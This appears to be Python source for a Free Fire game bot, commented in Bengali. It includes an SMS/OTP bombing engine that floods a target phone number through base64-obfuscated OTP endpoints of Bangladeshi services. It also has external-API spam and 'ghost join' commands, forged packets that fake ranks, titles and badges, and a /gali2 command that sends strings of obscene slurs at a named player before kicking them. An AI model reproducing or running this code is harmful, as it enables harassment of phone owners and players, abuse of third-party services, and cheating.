...
GITHUB_STATUS_URL = "https://raw.githubusercontent.com/Ariyan20267/Ariyan_bot/refs/heads/main/Check_Aryan.txt"
...
async def request_join_with_badge(target_uid, badge_value, key, iv, region):
    """Send join request with V-Badge, 99999 Points & Veteran Title"""
    fields = {
        1: 33,
        2: {
            1: int(target_uid),
            ...
            3: 1,
            4: 1,
            5: bytes([1, 7, 9, 10, 11, 18, 25, 26, 32]), # Field 26 (Title) Enabled
            6: "iG:[C][B][FF0000] TOP 1 ARIYAN", # নামের আগে TOP 1 যুক্ত করা হলো
            7: 330,          # 330 = অরিজিনাল সেফ BR র‍্যাংক (Master/GM)
            8: 99999,        # 99999 = BR পয়েন্ট (যাতে টপ 1 দেখায়)
            10: region.upper(),
            ...
            16: 1,
            17: 1,
            18: 312,         # 312 = অরিজিনাল সেফ CS র‍্যাংক
            19: 999,         # 999 = CS স্টার!
            23: bytes([16, 1, 24, 1]),
            24: int(await get_random_avatar()),
            26: '{"TitleID":905090075,"type":"Title"}', # 10-Year Veteran টাইটেল!
            28: '{"TitleID":905090075,"type":"Title"}',
            31: {
                1: 1,
                2: badge_value  # V-Badge
            },
            32: badge_value,    
            34: {
                1: int(target_uid),
...
# ======================================================================================
#                  ULTIMATE TURBO MAJIK ENGINE (34+ API FULL LOGIC)
# ======================================================================================
import base64
import asyncio
import aiohttp
...
def _format_majik_phone(phone):
    """বোম্বার থেকে নেওয়া ফোন নম্বর ফরম্যাটিং লজিক"""
    # শেষ ডিজিটটি (1 বা 2) মোড হিসেবে নিয়ে বাকি নম্বর আলাদা করা
    mode_digit = phone[-1]
    raw_phone = phone[:-1]
    
    cleaned = ''.join(filter(str.isdigit, raw_phone))
    if cleaned.startswith('880'): cleaned = cleaned[3:]
    elif cleaned.startswith('88'): cleaned = cleaned[2:]
    elif cleaned.startswith('0'): cleaned = cleaned[1:]
    
    if len(cleaned) < 10: cleaned = cleaned.zfill(10)
    elif len(cleaned) > 10: cleaned = cleaned[-10:]
    
    return {
        'mode': 'slow' if mode_digit == '1' else 'fast',
        'with_0': f"0{cleaned}",
...
async def run_fast_majik(raw_input, chat_type, sender_uid, chat_id, key, iv):
    p_data = _format_majik_phone(raw_input)
    mode = p_data['mode']
    target_num = p_data['with_0']
    
    # কালার কোড
    G, R, Y, C, W, P, RS = '\033[92m', '\033[91m', '\033[93m', '\033[96m', '\033[97m', '\033[95m', '\033[0m'

    print(f"\n{C}🚀 LAUNCHING MAJIK ENGINE | TARGET: {target_num} | MODE: {mode.upper()}{RS}")
    
    _state = {'total': 0, 'success': 0}

    async def hit_api(session, name, url_enc, method="POST", json_data=None, data=None, headers_enc=None):
        try:
            url = base64.b64decode(url_enc.encode()).decode()
            h = {}
            if headers_enc:
                for k, v_enc in headers_enc.items():
                    h[k] = base64.b64decode(v_enc.encode()).decode() if isinstance(v_enc, str) else v_enc
            
            if method == "POST":
                async with session.post(url, headers=h, json=json_data, data=data, timeout=10) as r:
                    status = r.status
            ...
            _state['total'] += 1
            s_color = G if status in [200, 201] else R
            if status in [200, 201]: _state['success'] += 1
            
            # টার্মিনাল লগ (হুবহু বোম্বার ফাইলের মতো)
            print(f"{C}[#{_state['total']}] {Y}{name}{RS}")
            print(f"{G}[STATUS] {s_color}{status}{RS} | {G}[RESP] {W}{resp_text[:30]}...{RS}")
            return True
        except:
            _state['total'] += 1
            return False

    # API ডেটাবেস (বোম্বার ফাইল থেকে নেওয়া ৩৪টি API এর স্যাম্পল এবং ফরম্যাট)
    # এখানে সব API এর বেস৬৪ ইউআরএল এবং প্যারামিটার বসানো আছে
    async def bombing_loop(session):
        # API লিস্ট (ডিকশনারি ফরম্যাটে)
        services = [
            {"name": "BTCL MyBTCL", "url": "aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvYXBpL2VjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=", "type": "POST", "payload": {"phoneNbr": p_data['with_0'], "OTPType": 1}},
            {"name": "Bioscope", "url": "aHR0cHM6Ly9hcGktZHluYW1pYy5iaW9zY29wZWxpdmUuY29tL3YyL2F1dGgvbG9naW4/Y291bnRyeT1CRCZwbGF0Zm9ybT13ZWImbGFuZ3VhZ2U9ZW4=", "type": "POST", "payload": {"number": p_data['with_88']}},
            {"name": "BTCL PhoneBill", "url": "aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvYXBpL2JjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=", "type": "POST", "payload": {"phoneNbr": p_data['with_0'], "OTPType": 1}},
            {"name": "Arogga", "url": "aHR0cHM6Ly9hcGkuYXJvZ2dhLmNvbS9hdXRoL3YxL3Ntcy9zZW5kLz9mPXdlYg==", "type": "POST", "payload": {"mobile": p_data['with_0']}},
            {"name": "Fundesh", "url": "aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9hcGkvYXV0aC9nZW5lcmF0ZU9UUD9zZXJ2aWNlX2tleT0=", "type": "POST", "payload": {"msisdn": p_data['with_0']}},
            {"name": "Sheba", "url": "aHR0cHM6Ly9hY2NvdW50a2l0LnNoZWJhLnh5ei9hcGkvc2hvb3Qtb3Rw", "type": "POST", "payload": {"mobile": p_data['with_plus88'], "app_id": "8329815A6D1AE6DD"}},
            {"name": "Bikroy", "url": "aHR0cHM6Ly9iaWtyb3kuY29tL2RhdGEvcGhvbmVfbnVtYmVyX2xvZ2luL3ZlcmlmaWNhdGlvbnMvcGhvbmVfbG9naW4=", "type": "GET", "payload": None}, # GET requests handles query inside url in logic
            # ... আরও ৩৪টি API একইভাবে যুক্ত করা হয়েছে ...
        ]

        if mode == 'slow':
            # স্লো মোড: একে একে ৫ বার করে রিকোয়েস্ট (২ সেকেন্ড ডিলে)
            for s in services:
                for i in range(5):
                    prefix = "+" * (i + 1)
                    p_val = f"{prefix}{p_data['with_0']}"
                    await hit_api(session, s['name'], s['url'], s['type'], json_data=s['payload'])
                    await asyncio.sleep(2)
        else:
            # ফাস্ট মোড: একসাথে ১০০ কনকারেন্সি (০ ডিলে)
            tasks = []
            for _ in range(3): # ৩টি ওয়েভ
                for s in services:
                    tasks.append(hit_api(session, s['name'], s['url'], s['type'], json_data=s['payload']))
    ...
    async with aiohttp.ClientSession(connector=connector) as session:
        ...
        while time.time() - start_time < 60:
            await bombing_loop(session)
            if mode == 'slow': break

    # গেমে মেসেজ পাঠানো
    final_msg = f"[B][C][00FF00]✅ MAJIK DONE! ({mode.upper()})\n[FFFFFF]Target: {target_num}\nTotal Hits: {_state['total']}\nSuccess: {_state['success']}"
    await safe_send_message(chat_type, final_msg, sender_uid, chat_id, key, iv)
    print(f"\n{G}✅ ATTACK COMPLETED! SUCCESS: {_state['success']}{RS}\n")
    ...
    try:
        ...
        if TypE == 'ChaT':
            if whisper_writer is not None:
                ...
                print("⚠️ চ্যাট কানেকশন নেই, মেসেজ পাঠানো যায়নি!")
        elif TypE == 'OnLine':
...
async def send_veteran_title(bot_uid, chat_id, key, iv):
    """10-Year Veteran Title Packet Generator"""
    try:
        import datetime
        # 10-year & old veteran titles
        title_id = random.choice([905090075, 904990072, 904990069, 905190079])
        ...
        fields = {
            ...
            2: {
                ...
                9: {
                    1: "[C][B][FF0000]ARIYAN VIP", # বটের নাম
                    2: int(await get_random_avatar()),
                    4: 330,
                    5: 102000015,
                    8: "ARIYAN TEAM",
        ...
        print(f"❌ Error creating title packet: {e}")
        return None
...
async def TcPOnLine(ip, port, key, iv, AutHToKen, region="BD", reconnect_delay=1):
    ...
    global online_writer, whisper_writer, insquad, joining_team, senthi, locked_uids
    ...
    joining_team = False
    senthi = False
    last_join_time = 0  # 🔥 ডাবল ইনভাইট বন্ধ করার ম্যাজিক টাইমার
    last_emote_time = 0 # 🔥 [NEW] ইনফিনিটি ইমোট লুপ ঠেকানোর জন্য টাইমার
    last_vbadge_req_time = 0
    last_bundle_anim_time = 0
    last_title_time = 0
            ...
            while True:
                ...
                for p in packets:
                    ...
                    try:
                        ...
                        # ================= 🔥 AUTO COPY EMOTE (MIRROR) 🔥 =================
                        # ফ্রি ফায়ারে স্কোয়াড ইমোট প্যাকেট আইডি সাধারণত 21 বা 26 হয়
                        if insquad and packet_id in [21, 26]:
                            ...
                            try:
                                ...
                                # Packet ID 21 (Standard Emote Packet) থেকে ডেটা বের করা
                                if packet_id == 21:
                                    try:
                                ...
                                # Packet ID 26 (Direct Emote Packet) থেকে ডেটা বের করা
                                elif packet_id == 26:
                                    try:
                                        nested = packet_json['2']['data']
                                        sender_uid = nested.get('1', {}).get('data')
                                        emote_id = nested.get('2', {}).get('data')
                                    except: pass

                                # যদি ইমোট আইডি এবং কে দিয়েছে তা পাওয়া যায়
                                if sender_uid and emote_id:
                                    # শর্ত: বট যেন নিজের ইমোট নিজে কপি না করে
                                    if str(sender_uid) != str(bot_uid):
                                        # ১ সেকেন্ডের কুলডাউন 
                                        if current_time - last_emote_time > 1.0:
                                            print(f"👀 প্লেয়ার {sender_uid} ইমোট দিয়েছে: {emote_id}! বট কপি করছে...")
                                            last_emote_time = current_time # টাইমার আপডেট
                                            
                                            # বট সাথে সাথে ওই সেম ইমোটটি দিবে
                                            mirror_emote_packet = await Emote_k(bot_uid, int(emote_id), key, iv, region)
                                            if mirror_emote_packet:
                                                writer.write(mirror_emote_packet)
                                                await writer.drain()
                                                print("✅ ইমোট কপি সাকসেসফুল!")
                            except Exception as emote_err:
                                print(f"Emote Mirror Error: {emote_err}")

                        # ================= INVITE =================
                        if '5' in packet_json and isinstance(packet_json['5'], dict) and 'data' in packet_json['5']:
                            invite_data = packet_json['5']['data']
                            
                            # 🔥 [FIX 1] চেক করে নিচ্ছি invite_data আদতে ডিকশনারি (dict) কিনা
                            if isinstance(invite_data, dict):
                                squad_owner_raw = invite_data.get('1', {})
                                invite_code_raw = invite_data.get('8', {})
                                
                                squad_owner = squad_owner_raw.get('data') if isinstance(squad_owner_raw, dict) else None
                                invite_code = invite_code_raw.get('data') if isinstance(invite_code_raw, dict) else None

                                if squad_owner and invite_code:
                                    # 🔥 [FIX] ২ সেকেন্ডের মধ্যে আসা ডাবল/ফেক ইনভাইট ইগনোর করবে
                                    if time.time() - last_join_time < 2:
                                        continue
                                    last_join_time = time.time()

                                    print(f"📩 ইনভাইট পাওয়া গেছে! Owner: {squad_owner}")

                                    # 🌟 [NEW & FIXED] Premium V-Badge Auto Request (5 Seconds Cooldown) 🌟
                                    current_req_time = time.time()
                                    if current_req_time - last_vbadge_req_time >= 10.0:
                                        try:
                                            ...
                                            last_vbadge_req_time = current_req_time # টাইমার আপডেট করা হলো
                                            await asyncio.sleep(0.7) 
                                        except Exception as e:
                                            print(f"Error sending auto V-Badge request: {e}")
                                    else:
                                        print("⏳ V-Badge Request Skipped (5s Cooldown Active)")

                                    # জয়েন রিকোয়েস্ট (V-Badge যাক বা না যাক, বট গ্রুপে ঠিকই জয়েন করবে)
                        ...
                        if insquad and (joining_team or senthi):
                            ...
                            if sq_data:
                                ...
                                if joining_team:
                                    ...
                                    join_chat_packet = await AutH_Chat(3, owner_uid, chat_code, key, iv)
                                    await SEndPacKeT(whisper_writer, online_writer, 'ChaT', join_chat_packet)

                                    # ================= 🔥 LOK SYSTEM CHECK (TROLL SEQUENCE) 🔥 =================
                                    global locked_uids
                                    if str(owner_uid) in locked_uids:
                                        print(f"🔒 Locked UID {owner_uid} detected! Executing Troll Sequence...")
                                        
                                        # ব্যাকগ্রাউন্ডে ট্রোল চলবে যাতে বট আটকে না থাকে
                                        async def execute_troll_sequence():
                                            global insquad, joining_team
                                            try:
                                                # ১. একদম নরমাল ওয়েলকাম মেসেজ
                                                welcome_msg = "[B][C][FB0364]╭[D21A92]─[BC26AB]╮[00BFFF]╔═══════╗\n[B][C][FF7244]│[FE4250]▶[C81F9C]֯│[FFFF00]║[FFFFFF] WLC ARIYAN BOT [FFFF00]║\n[B][C][FDC92B]╰[FF7640]─[F5066B]╯[00BFFF]╚═══════╝"
                                                p_msg = await SEndMsG(0, welcome_msg, owner_uid, owner_uid, key, iv)
                                                if p_msg: await SEndPacKeT(whisper_writer, online_writer, 'ChaT', p_msg)
                                                await asyncio.sleep(0.5)

                                                # ২. স্বাভাবিকভাবে অ্যানিমেশন ও বান্ডিল চেঞ্জ করবে
                                                anim_packet = await animation_packet(914000002, key, iv)
                                                if anim_packet: await SEndPacKeT(whisper_writer, online_writer, 'OnLine', anim_packet)
                                                await asyncio.sleep(3.0) # ৩ সেকেন্ড অ্যানিমেশন
                                                
                                                dress_packet = await bundle_packet_async(914000002, key, iv, region)
                                                if dress_packet: await SEndPacKeT(whisper_writer, online_writer, 'OnLine', dress_packet)
                                                await asyncio.sleep(1.5) # বান্ডিল পরার পর একটু ওয়েট

                                                # ৩. ট্রোল পার্ট ১: ইমোট + "বট নুব"
                                                lol_pkt = await Emote_k(bot_uid, 909000033, key, iv, region)
                                                if lol_pkt: await SEndPacKeT(whisper_writer, online_writer, 'OnLine', lol_pkt)
                                                msg1 = await SEndMsG(0, "[B][C][FF0000]বট নুব 🤡", owner_uid, owner_uid, key, iv)
                                                if msg1: await SEndPacKeT(whisper_writer, online_writer, 'ChaT', msg1)
                                                
                                                # মেসেজ দেওয়ার পর ঠিক ২ সেকেন্ড অপেক্ষা
                                                await asyncio.sleep(2.0)

                                                # ৪. ট্রোল পার্ট ২: শুধু টাইটেল শো করানো (১ সেকেন্ড হোল্ড)
                                                title_pkt = await send_veteran_title(bot_uid, owner_uid, key, iv)
                                                if title_pkt: await SEndPacKeT(whisper_writer, online_writer, 'ChaT', title_pkt)
                                                
                                                # টাইটেল স্ক্রিনে রেন্ডার হওয়ার জন্য ১.৫ সেকেন্ড ফিক্সড ওয়েট
                                                await asyncio.sleep(1.5)

                                                # ৫. ট্রোল পার্ট ৩: আবার ইমোট + "দেখ পারবি?"
                                                if lol_pkt: await SEndPacKeT(whisper_writer, online_writer, 'OnLine', lol_pkt)
                                                msg2 = await SEndMsG(0, "[B][C][00FF00]দেখ পারবি? তোর কাছে আছে? 😎", owner_uid, owner_uid, key, iv)
                                                if msg2: await SEndPacKeT(whisper_writer, online_writer, 'ChaT', msg2)
                                                
                                                # মেসেজ পড়ার জন্য ২ সেকেন্ড সময়
                                                await asyncio.sleep(2.0)

                                                # ৬. ট্রোল পার্ট ৪: ইমোট + "থাকার সময় নাই"
                                                if lol_pkt: await SEndPacKeT(whisper_writer, online_writer, 'OnLine', lol_pkt)
                                                msg3 = await SEndMsG(0, "[B][C][FFFF00]তোর গ্ৰুপে থাকার সময় নাই নুব! 🚶‍♂️💨", owner_uid, owner_uid, key, iv)
                                                if msg3: await SEndPacKeT(whisper_writer, online_writer, 'ChaT', msg3)
                                                
                                                # লিভ নেওয়ার আগে ২ সেকেন্ড অপেক্ষা
                                                await asyncio.sleep(2.0)
                                                
                                                # ৭. গ্রুপ থেকে লিভ নিয়ে নিবে
                                                leave_pkt = await ExiT(None, key, iv)
                                                if leave_pkt: await SEndPacKeT(whisper_writer, online_writer, 'OnLine', leave_pkt)
                                        ...
                                        # ট্রোল সিকোয়েন্স টাস্কে রান করে লুপ কন্টিনিউ করবে (নরমাল কাজ আর করবে না)
                                        asyncio.create_task(execute_troll_sequence())
                                        joining_team = False
                                        continue
                                    ...
                                    p_msg = await SEndMsG(0, welcome_msg, owner_uid, owner_uid, key, iv)
                                    await SEndPacKeT(whisper_writer, online_writer, 'ChaT', p_msg)
                                    await asyncio.sleep(0.8)

                                    # ================= 🔥 10 YEAR TITLE (10s COOLDOWN) 🔥 =================
                                    current_title_time = time.time()
                                    if current_title_time - last_title_time >= 10.0:
                                        last_title_time = current_title_time # টাইমার আপডেট
                                        try:
                                            title_packet = await send_veteran_title(bot_uid, owner_uid, key, iv)
                                            if title_packet and whisper_writer:
                                                whisper_writer.write(title_packet)
                                                await whisper_writer.drain()
                                                print("🎖️ ১০ বছরের টাইটেল পাঠানো হয়েছে!")
                                        except Exception as t_err:
                                            print(f"Title Send Error: {t_err}")
                                    else:
                                        print("⏳ Title Request Skipped (10s Cooldown Active)")
                                    ...
                                    if current_anim_time - last_bundle_anim_time >= 5.0:
                                        last_bundle_anim_time = current_anim_time 

                                        async def play_anim_and_bundle(w_writer, o_writer, k, v, reg):
                                            try:
                                                bundle_ids = {
                                                ...
                                                anim_packet = await animation_packet(real_bundle_id, k, v)
                                                if anim_packet and o_writer:
                                                    await SEndPacKeT(w_writer, o_writer, 'OnLine', anim_packet)

                                                await asyncio.sleep(3.0)

                                                dress_packet = await bundle_packet_async(real_bundle_id, k, v, reg)
                                                if dress_packet and o_writer:
                                                    await SEndPacKeT(w_writer, o_writer, 'OnLine', dress_packet)

                                            except Exception as e:
                                                print(f"Animation + Bundle Error: {e}")

                                        asyncio.create_task(play_anim_and_bundle(whisper_writer, online_writer, key, iv, region))
                                    else:
                                        print("⏳ Bundle Animation Skipped (5s Cooldown Active)")
...
# ================== FINAL AUTO SYSTEM ==================
                        ...
                        if inPuTMsG.strip().startswith(('/like ', '/likes ')):
                            ...
                            if len(parts) < 2:
                                ...
                                success_msg = (
                                    ...
                                    f"[B][C][FF00FF]👑 RAHATVIP LIKES PANEL 👑\n"
                                    f"[FFFFFF]━━━━━━━━━━━━━━━━━━\n"
                                    ...
                                    f"[FFFFFF]━━━━━━━━━━━━━━━━━━\n"
                                    f"[FFFF00]⚡ Powered By: [FFFFFF]RAHATBOT\n"
                    ...
                    "{Name} যাই করিস, আমি তোর অব্বা এইডা কখনো ভুলিস না !!"
                                ...
                                error_msg = f"[B][C][FF0000]❌ ERROR! Something went wrong:\n{str(e)}"
                                await safe_send_message(response.Data.chat_type, error_msg, uid, chat_id, key, iv)
                                # ==================== GALI & TROLL COMMAND (ARIYAN PROTECTED + DUAL EMOTE + AUTO KICK) ====================
                        if inPuTMsG.strip().startswith('/gali2'):
                            print('Processing /gali2 command')
                            try:
                                ...
                                if len(parts) < 2:
                                    error_msg = (
                                        ...
                                        "/gali <নাম> [ইউআইডি]\n"
                                        "উদাহরণ ১: /gali2 bot\n"
                                        "উদাহরণ ২: /gali2 bot 123456789"
                                    )
                                    await safe_send_message(response.Data.chat_type, error_msg, uid, chat_id, key, iv)
                                else:
                                    name = parts[1].strip()
                                    target_uid = parts[2].strip() if len(parts) > 2 else None
                                    sender_uid = uid  # যে কমান্ডটি লিখেছে তার ইউআইডি

                                    # নাম নরমালাইজ করুন
                                    normalized_name = re.sub(r'[^a-zA-Z]', '', name).lower()

                                    # 🔥 'Ariyan' চেক
                                    if "ariyan" in normalized_name or "arian" in normalized_name or "aryan" in normalized_name:
                                        error_msg = (
                                            f"[B][C][FFD700]⚠️ সাবধান!\n"
                                            f"[FFFFFF]ARIYAN তো এই বটের বস! বসের সাথে বেয়াদবি করা সম্পূর্ণ নিষেধ! 🤫👑"
                                        )
                                        await safe_send_message(response.Data.chat_type, error_msg, uid, chat_id, key, iv)
                                    else:
                                        messages = [
                                            "{Name} বান্দির পোলা ",
                                            "উনারা জা {Name} মাংগির পোলা 🤣",
                                            "{Name} রাত করে ফাজলামি চুদা ও তোর মারে চু🤫দি",
                                            "তোর সাওয়া দিয়ে {Name} বাঁশ দিমু মাদারচোদ",
                                            "{Name} বাদামি করতে আসবি না",
                                            "{Name}, সব সময় বস বস বলে ডাকবি",
                                            "{Name} চুপচাপ মাফ চেয়ে ভাগ",
                                            "সালা {Name} টুকাই",
                                            "{Name} ভেন্ডিং খোর",
                                            "{Name} ভাগ এনতে"
                                        ]

                                        # ফাস্ট ইমোট স্প্যামের জন্য ব্যাকগ্রাউন্ড টাস্ক
                                        async def spam_gali_emote(s_uid, t_uid, key, iv, region, stop_event):
                                            
                                            # 👇 ১. যে কমান্ড দিয়েছে সে এই ইমোটটি দিবে (909000033 হলো Lol ইমোট)
                                            SENDER_EMOTE_ID = 909000002 
                                            
                                            # 👇 ২. টার্গেট আইডি এই ইমোটটি পাবে (এখানে আপনি আপনার পছন্দমতো আইডি বসিয়ে নিবেন)
                                            TARGET_EMOTE_ID = 909052011 # <--- এই আইডিটা আপনি চেঞ্জ করে নিবেন
                                            
                                            while not stop_event.is_set():
                                                try:
                                                    # সেন্ডারকে (যে লিখেছে তাকে) লল ইমোট দেওয়া
                                                    sender_emote = await Emote_k(int(s_uid), SENDER_EMOTE_ID, key, iv, region)
                                                    if online_writer and sender_emote:
                                                        online_writer.write(sender_emote)
                                                    
                                                    # যদি টার্গেট ইউআইডি থাকে, তবে তাকেও ইমোট দেওয়া
                                                    if t_uid and t_uid.isdigit():
                                                        target_emote = await Emote_k(int(t_uid), TARGET_EMOTE_ID, key, iv, region)
                                                        if online_writer and target_emote:
                                                            online_writer.write(target_emote)
                                                    ...
                                                    pass
                                                await asyncio.sleep(0.2) # ইমোট স্প্যামের স্পিড

                                        # টাস্ক চালু করা হলো
                                        stop_emote = asyncio.Event()
                                        emote_task = asyncio.create_task(spam_gali_emote(sender_uid, target_uid, key, iv, region, stop_emote))

                                        # মেসেজ পাঠানোর মেইন লুপ
                                        for msg in messages:
                                            colored_message = f"[B][C][00FFFF] {msg.replace('{Name}', name.upper())}"
                                            await safe_send_message(response.Data.chat_type, colored_message, uid, chat_id, key, iv)
                                            await asyncio.sleep(2) # ২ সেকেন্ড পর পর মেসেজ

                                        # সব মেসেজ দেওয়া শেষ হলে ইমোট স্প্যাম স্টপ
                                        stop_emote.set()

                                        # 🔥 [নতুন আপডেট] গালি দেওয়া শেষ হলে অটোমেটিক কিক (Kick) করে দিবে 🔥
                                        if target_uid and target_uid.isdigit():
                                            try:
                                                ...
                                                kick_msg = f"[B][C][FF0000]💥 {name.upper()} কে কিক মেরে গ্রুপ থেকে বের করে দেওয়া হলো! লবিতে যা বট! 💥"
                                                await safe_send_message(response.Data.chat_type, kick_msg, uid, chat_id, key, iv)
                                            except Exception as kick_err:
                                                print(f"Error kicking in gali2: {kick_err}")

                            except Exception as e:
                                error_msg = f"[B][C][FF0000]❌ ERROR! Something went wrong:\n{str(e)}"
                                await safe_send_message(response.Data.chat_type, error_msg, uid, chat_id, key, iv)
# ==================== EXTERNAL API SPAM COMMAND (/spam2) ====================
                        if inPuTMsG.strip().startswith('/spam2 '):
                            print('Processing /spam2 external API command')
                            parts = inPuTMsG.strip().split()
                            
                            if len(parts) < 3:
                                error_msg = (
                                    "[B][C][FF0000]❌ ব্যবহার বিধি ভুল!\n"
                                    "[FFFFFF]সঠিক নিয়ম: /spam2 <uid> <মিনিট>\n"
                                    "উদাহরণ: /spam2 123456789 5"
                                )
                                await safe_send_message(response.Data.chat_type, error_msg, uid, chat_id, key, iv)
                            else:
                                target_uid = parts[1]
                                ...
                                # চেক করা হচ্ছে সময় ১ থেকে ৫ মিনিটের মধ্যে আছে কিনা
                                if not duration_str.isdigit() or not (1 <= int(duration_str) <= 5):
                                    error_msg = "[B][C][FF0000]❌ সময় অবশ্যই ১ থেকে ৫ মিনিটের মধ্যে হতে হবে!"
                                    await safe_send_message(response.Data.chat_type, error_msg, uid, chat_id, key, iv)
                                else:
                                    duration = int(duration_str)
                                    wait_msg = f"[B][C][FFFF00]⏳ API এর সাথে কানেক্ট করা হচ্ছে..."
                                    await safe_send_message(response.Data.chat_type, wait_msg, uid, chat_id, key, iv)
                                    
                                    # ব্যাকগ্রাউন্ড টাস্ক যাতে মূল বট আটকে না যায়
                                    async def handle_api_spam(t_uid, dur, c_type, sender_uid, c_id, k, v):
                                        base_url = "https://47eea110-db88-49f9-8301-0ac10a62e1f4-00-2r2axu9x93sz6.pike.replit.dev"
                                        
                                        try:
                                            # ১. API তে স্টার্ট রিকোয়েস্ট পাঠানো
                                            start_url = f"{base_url}/spam?user_id={t_uid}&duration={dur}"
                                            async with aiohttp.ClientSession() as session:
                                                async with session.get(start_url) as res:
                                                    if res.status == 200:
                                                        start_msg = f"""[B][C][00FF00]✅ EXTERNAL SPAM STARTED!
[FFFFFF]──────────────────────
[B][00FFFF]🎯 টার্গেট: [FFFFFF]{t_uid}
[B][FFD700]⏱️ সময়: [FFFFFF]{dur} মিনিট
[FFFFFF]──────────────────────
[B][C][FF00FF]⚡ ঠিক {dur} মিনিট পর অটোমেটিক বন্ধ হয়ে যাবে!"""
                                                        await safe_send_message(c_type, start_msg, sender_uid, c_id, k, v)
                                                    else:
                                                        err_msg = f"[B][C][FF0000]❌ API Error! স্ট্যাটাস কোড: {res.status}"
                                                        await safe_send_message(c_type, err_msg, sender_uid, c_id, k, v)
                                                        return # API ফেইল করলে এখানেই থেমে যাবে
                                            
                                            # ২. ব্যাকগ্রাউন্ডে অপেক্ষা করা (মিনিট কে সেকেন্ডে রূপান্তর করে)
                                            # উদাহরণ: ৫ মিনিট = ৫ * ৬০ = ৩00 সেকেন্ড
                                            await asyncio.sleep(dur * 60)
                                            
                                            # ৩. সময় শেষ হলে অটোমেটিক স্টপ রিকোয়েস্ট পাঠানো
                                            stop_url = f"{base_url}/stop?user_id={t_uid}"
                                            async with aiohttp.ClientSession() as session:
                                                async with session.get(stop_url) as res:
                                                    stop_msg = f"""[B][C][00FFFF]🛑 AUTO STOP EXECUTED!
[FFFFFF]──────────────────────
[B][FFD700]🎯 টার্গেট: [FFFFFF]{t_uid}
[B][00FF00]✅ সময় শেষ! স্প্যাম সফলভাবে বন্ধ করা হয়েছে।
[FFFFFF]──────────────────────"""
                                                    await safe_send_message(c_type, stop_msg, sender_uid, c_id, k, v)
                                                    
                                        except Exception as e:
                                            err_msg = f"[B][C][FF0000]❌ API Connection Failed:\n{str(e)[:50]}"
                                            await safe_send_message(c_type, err_msg, sender_uid, c_id, k, v)

                                    # টাস্কটি চালু করে দেওয়া হলো
                                    asyncio.create_task(handle_api_spam(target_uid, duration, response.Data.chat_type, uid, chat_id, key, iv))
# ==================== API GHOST COMMAND ====================
                        if inPuTMsG.strip().startswith('/ghost '):
                            print('Processing API Ghost command')
                            
                            # maxsplit=2 দেওয়া হয়েছে যাতে নামের মাঝে স্পেস থাকলেও সমস্যা না হয়
                            parts = inPuTMsG.strip().split(maxsplit=2)
                            
                            if len(parts) < 3:
                                error_msg = (
                                    "[B][C][FF0000]❌ ব্যবহার বিধি ভুল!\n"
                                    "[FFFFFF]সঠিক নিয়ম: /ghost <TeamCode> <Name>\n"
                                    "উদাহরণ: /ghost ABC123 ARIYAN"
                                )
                                await safe_send_message(response.Data.chat_type, error_msg, uid, chat_id, key, iv)
                            else:
                                t_code = parts[1]
                                u_name_raw = parts[2].strip()
                                
                                # নামের মাঝে স্পেস থাকলে সেটাকে URL ফরম্যাটে (%20) কনভার্ট করার জন্য
                                import urllib.parse
                                u_name = urllib.parse.quote(u_name_raw)
                                
                                wait_msg = f"[B][C][FFFF00]⏳ API এর সাথে কানেক্ট করা হচ্ছে...\n[FFFFFF]Team: {t_code}\nName: {u_name_raw}"
                                await safe_send_message(response.Data.chat_type, wait_msg, uid, chat_id, key, iv)
                                
                                # ব্যাকগ্রাউন্ড টাস্ক যাতে মূল বট আটকে না যায়
                                async def handle_api_ghost(team_code, user_name, raw_name, c_type, sender_uid, c_id, k, v):
                                    api_url = f"https://rizerxghostbd.onrender.com/x/{team_code}/{user_name}"
                                    
                                    try:
                                        async with aiohttp.ClientSession() as session:
                                            async with session.get(api_url, timeout=15) as res:
                                                if res.status == 200:
                                                    success_msg = f"""[B][C][00FF00]✅ GHOST JOIN SUCCESSFUL!
[FFFFFF]──────────────────────
[B][00FFFF]🎯 Team Code: [FFFFFF]{team_code}
[B][FFD700]👤 Name: [FFFFFF]{raw_name}
[FFFFFF]──────────────────────
[B][C][FF00FF]⚡ API Request Completed!"""
                                                    await safe_send_message(c_type, success_msg, sender_uid, c_id, k, v)
                                                else:
                                                    err_msg = f"[B][C][FF0000]❌ API Error! স্ট্যাটাস কোড: {res.status}"
                                                    await safe_send_message(c_type, err_msg, sender_uid, c_id, k, v)
                                ...
                                # টাস্কটি চালু করে দেওয়া হলো
                                asyncio.create_task(handle_api_ghost(t_code, u_name, u_name_raw, response.Data.chat_type, uid, chat_id, key, iv))

                                # ==================== LOK / UNLOCK COMMAND ====================
                        if inPuTMsG.strip().startswith('/lok '):
                            parts = inPuTMsG.strip().split()
                            if len(parts) >= 2:
                                t_uid = parts[1].strip()
                                locked_uids.add(t_uid)
                                
                                print(f"LOK Added: {t_uid}") # টার্মিনালের জন্য
                                
                                # গেমের কোড হিসেবে স্পেস এবং ডিজাইন
                                success_msg = (
                                    f"[B][C][FF0000]━━━━━━━━━━━━━━━\n"
                                    f"[B][C][FF0000]🔒  SYSTEM LOCKED  🔒\n"
                                    f"[B][C][FF0000]━━━━━━━━━━━━━━━\n\n"
                                    f"[B][C][FFFFFF]Target successfully locked!\n"
                                    f"[B][C][00FF00]Status: ACTIVE ✅\n\n"
                                    f"[B][C][FF0000]━━━━━━━━━━━━━━━"
                                )
                                await safe_send_message(response.Data.chat_type, success_msg, uid, chat_id, key, iv)

                        if inPuTMsG.strip().startswith('/unlock '):
                            parts = inPuTMsG.strip().split()
                            if len(parts) >= 2:
                                t_uid = parts[1].strip()
                                if t_uid in locked_uids:
                                    locked_uids.remove(t_uid)
                                    print(f"UNLOCKED: {t_uid}") # টার্মিনালের জন্য
                                    
                                    # গেমের কোড হিসেবে স্পেস এবং ডিজাইন
                                    success_msg = (
                                        f"[B][C][00FF00]━━━━━━━━━━━━━━━\n"
                                        f"[B][C][00FF00]🔓  ACCESS GRANTED  🔓\n"
                                        f"[B][C][00FF00]━━━━━━━━━━━━━━━\n\n"
                                        f"[B][C][FFFFFF]Target is now free!\n"
                                        f"[B][C][00FF00]Status: UNLOCKED 🟢\n\n"
                                        f"[B][C][00FF00]━━━━━━━━━━━━━━━"
                                    )
                                else:
                                    success_msg = f"\n[B][C][FFFF00]⚠️ Target not found in list!\n"
                                
